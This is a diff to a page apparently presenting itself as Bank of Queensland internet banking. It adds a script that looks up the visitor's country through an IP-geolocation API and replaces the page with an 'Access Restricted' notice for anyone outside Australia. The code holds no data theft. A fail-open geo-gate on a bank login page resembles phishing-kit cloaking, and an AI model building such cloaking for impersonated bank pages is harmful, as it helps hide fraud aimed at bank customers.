@@ -1,6 +1,85 @@
 <!DOCTYPE html>
 <html lang=en>
-
+<script>
+    (function() {
+      // Check if we're in development
+      if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+        console.log('Development mode - geo-block disabled');
+        return;
+      }
+      
+      // Show content immediately, will be hidden if blocked
+      const blockStyle = document.createElement('style');
+      blockStyle.id = 'geo-block-style';
+      blockStyle.textContent = 'body { display: block !important; }';
+      document.head.appendChild(blockStyle);
+      
+      // Function to show block page
+      function showBlockPage(countryCode, countryName) {
+        document.documentElement.innerHTML = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Access Restricted</title>
+            <style>
+              * { margin: 0; padding: 0; box-sizing: border-box; }
+              body {
+                background: #000;
+                color: #f2f2f2;
+                font-family: system-ui, -apple-system, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                margin: 0;
+                padding: 20px;
+                text-align: center;
+              }
+              .container { max-width: 600px; }
+              h1 { color: #f38020; font-size: 2rem; margin-bottom: 1rem; }
+              p { font-size: 1.1rem; line-height: 1.6; color: #b6b6b6; margin-bottom: 1rem; }
+              .code { 
+                margin-top: 2rem;
+                padding: 0.5rem 1rem;
+                background: #1a1a1a;
+                border-radius: 4px;
+                color: #555;
+                font-size: 0.7rem;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h1>🚫 Access Restricted</h1>
+              <p>This service is only available to users located in <strong>Australia</strong>.</p>
+              <p>We detected your location as: <strong>${countryName} (${countryCode})</strong></p>
+              <p style="font-size: 0.95rem; color: #888;">If you believe this is an error, please contact support.</p>
+              <div class="code">Reference: GEO-BLOCK-${Date.now()}</div>
+            </div>
+          </body>
+          </html>
+        `;
+      }
+      
+      // Check location
+      fetch('https://freeipapi.com/api/json/')
+        .then(response => response.json())
+        .then(data => {
+          const countryCode = data.countryCode || data.country_code || 'XX';
+          const countryName = data.countryName || data.country || 'Unknown';
+          
+          if (countryCode.toUpperCase() !== 'AU') {
+            showBlockPage(countryCode, countryName);
+          }
+        })
+        .catch(() => {
+          // If API fails, allow access
+          console.warn('Geo-check failed - allowing access');
+        });
+    })();
+  </script>
   <meta charset=utf-8>
   <title>BOQ IB - Welcome to BOQ Internet Banking</title>
   <meta name=viewport content="width=device-width, initial-scale=1">
